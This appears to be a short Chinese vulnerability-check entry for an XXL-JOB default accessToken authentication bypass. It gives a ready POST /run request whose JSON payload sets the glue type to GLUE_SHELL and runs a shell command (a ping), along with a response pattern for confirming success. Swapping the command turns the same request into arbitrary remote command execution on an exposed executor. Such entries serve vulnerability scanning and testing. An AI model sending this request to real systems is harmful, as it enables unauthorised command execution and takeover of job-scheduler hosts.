# XXL-JOB默认accessToken身份绕过漏洞

XXL ｜ 其他 ｜ —
- **请求**：`POST /run HTTP/1.1`

**Payload**
```
"jobId": 1,
"executorHandler": "demoJobHandler",
"executorParams": "demoJobHandler",
"executorBlockStrategy": "SERIAL_EXECUTION",
"executorTimeout": 0,
"logId": 1,
"logDateTime": 1586373637819,
"glueType": "GLUE_SHELL",
"glueSource": "ping www.baidu.com",
"glueUpdatetime": 1586693836766,
"broadcastIndex": 0,
"broadcastTotal": 0
```
- **响应特征**：200 ^(?=.*?code)(?=.*?200).*?$